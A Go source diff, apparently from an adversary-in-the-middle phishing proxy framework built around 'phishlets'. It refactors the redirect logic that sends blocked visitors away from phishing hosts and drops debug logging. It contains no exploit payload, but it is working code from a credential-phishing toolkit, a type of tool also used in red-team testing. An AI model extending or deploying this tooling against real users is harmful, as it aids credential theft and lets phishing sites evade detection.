@@ -1033,41 +1033,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
+	// Check if a general redirect URL is provided
 	if len(p.cfg.general.RedirectUrl) > 0 {
-
 		redirect_url := p.cfg.general.RedirectUrl
-		phishlet_redirect_url := p.getPhishletByPhishHost(req.Host).redirect_url
-
-		log.Warning("req.Host: [%s]", req.Host)
-		log.Warning("redirect url: [%s]", redirect_url)
-		log.Warning("phish_redir_url: [%s]", phishlet_redirect_url)
-		log.Warning("phishlet_domains: [%s]", p.getPhishletByPhishHost(req.Host).domains)
-		log.Warning("phishlet_proxy_hosts: [%s]", p.getPhishletByPhishHost(req.Host).proxyHosts)
-		log.Warning("phishlet_login_url: [%s]", p.getPhishletByPhishHost(req.Host).GetLoginUrl())
-		log.Warning("phishlet_phish_hosts: [%s]", p.getPhishletByPhishHost(req.Host).GetPhishHosts(false))
-
+		pl := p.getPhishletByPhishHost(req.Host)
+		// Check if a phishlet-specific redirect URL is available for the current request's host
+		phishlet_redirect_url := pl.redirect_url
+		// Overwrite general redirect URL if phishlet-specific URL is available
 		if len(phishlet_redirect_url) > 0 {
-			match := false
-			for _, host := range p.getPhishletByPhishHost(req.Host).GetPhishHosts(false) {
-				if strings.Contains(req.Host, host) {
-					match = true
-					break
-				}
-			}
-			log.Warning("req contains phish redirect rul?: [%s]", match)
-			if match {
-				log.Warning("phishlet redirect override: [%s]", phishlet_redirect_url)
-				redirect_url = phishlet_redirect_url
-			}
+			log.Info("phishlet redirect override for [%s]", pl.Name)
+			redirect_url = phishlet_redirect_url
 		}
-
-		//redirect_url = phishlet_redirect_url
-
-		//if (len(phishlet_redirect_url) > 0) && (strings.Contains(p.getPhishletByPhishHost(req.Host).GetLoginUrl(), req.Host)) {
-		//	log.Warning("req contains phish redirect rul?: [%s]", strings.Contains(p.getPhishletByPhishHost(req.Host).GetLoginUrl(), req.Host))
-		//	redirect_url = phishlet_redirect_url
-		//	log.Warning("phishlet redirect override: [%s]", phishlet_redirect_url)
-		//}
 
 		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 		if resp != nil {
